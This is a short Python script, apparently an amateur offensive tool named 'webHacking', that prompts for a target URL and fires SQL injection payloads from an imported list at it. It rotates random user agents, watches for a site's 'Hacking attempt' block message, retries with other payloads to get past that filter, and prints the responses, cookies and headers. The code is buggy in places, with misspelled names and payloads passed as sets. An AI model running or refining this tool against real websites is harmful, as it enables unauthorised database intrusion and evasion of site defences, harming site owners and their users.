
from settings import SQL_INJECT_REQUESTS, userahents

import random 
import pip._vendor.requests as requests


headers = { 
      "User-Agent": random.choice(userahents)
}

class webHacking(): 

    def inject(url): 
          response_url = input("[*]URL ->> ") 
          
          response = requests.post(url=response_url, headers={
               "User-Agent": random.choice(userahents)
          }) 

          if response.status_code == 200: 
               attack_response = requests.post(url=f"{response_url}/?params={SQL_INJECT_REQUESTS[0]}", headers=headers) 

               if "Hacking attepmt" in attack_response.text:  
                    
                    global new_attack

                    new_attack = requests.get(url=response_url, headers = { 
                         'User-Agent': random.choice(userahents)
                    }, 
                    params={ 
                         SQL_INJECT_REQUESTS[1]
                    }) 

                    if "Hacking attempt" in new_attack.text: 
                         new_connect = requests.post(url = response_url, headers={ 
                            'User-Agent': random.choice(userahents)  
                         }, 
                         params={ 
                             SQL_INJECT_REQUESTS[10]
                         }) 

                    else: 
                         print(new_attack.text) 
                         print(new_attack.headers) 
                         
               else: 
                    print(attack_response.text) 
                    print(attack_response.cookies) 
                    print(attack_response.headers)
          else: 
               print(f"Erorr: {response.status_code}") 
    

    